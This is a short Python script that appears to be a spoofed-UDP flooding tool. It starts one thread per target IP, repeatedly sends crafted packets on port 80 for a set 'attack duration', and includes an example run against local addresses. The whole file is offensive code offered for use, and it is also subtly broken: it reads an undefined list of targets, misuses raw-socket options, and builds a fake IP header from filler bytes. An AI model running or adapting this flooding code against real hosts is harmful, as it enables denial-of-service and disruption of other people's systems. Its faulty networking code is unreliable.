import socket
import threading
import time
from typing import List

def send_spoofed_udp_packets(src_ip: str, src_port: int, dst_ip: str, dst_port: int, message: str, attack_duration: int):
    def target(ip):
        while not stop_event.is_set():
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.bind((src_ip, src_port))
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    packet = (b"E" * 20) + src_port.to_bytes(2, 'big') + dst_port.to_bytes(2, 'big') + len(message).to_bytes(2, 'big') + message.encode()
                    sock.sendto(packet, (ip, dst_port))
                    time.sleep(0.1)
            except Exception as e:
                print(f"Error sending packet to {ip}: {e}")

    def stop_all_threads():
        stop_event.set()
        for thread in threads:
            thread.join()

    if not all(isinstance(ip, str) for ip in dst_ips):
        raise ValueError("All destination IPs must be strings.")
    if not isinstance(attack_duration, int) or attack_duration <= 0:
        raise ValueError("Attack duration must be a positive integer.")

    stop_event = threading.Event()
    threads = []

    for ip in dst_ips:
        thread = threading.Thread(target=target, args=(ip,))
        thread.start()
        threads.append(thread)

    time.sleep(attack_duration)
    stop_all_threads()

# Example usage
if __name__ == "__main__":
    # Example parameters for the function
    src_ip = '192.168.0.1'
    src_port = 12345
    dst_ips = ['192.168.0.100', '192.168.0.101']
    dst_port = 80
    message = "Test message"
    attack_duration = 10  # seconds

    send_spoofed_udp_packets(src_ip, src_port, dst_ips[0], dst_port, message, attack_duration)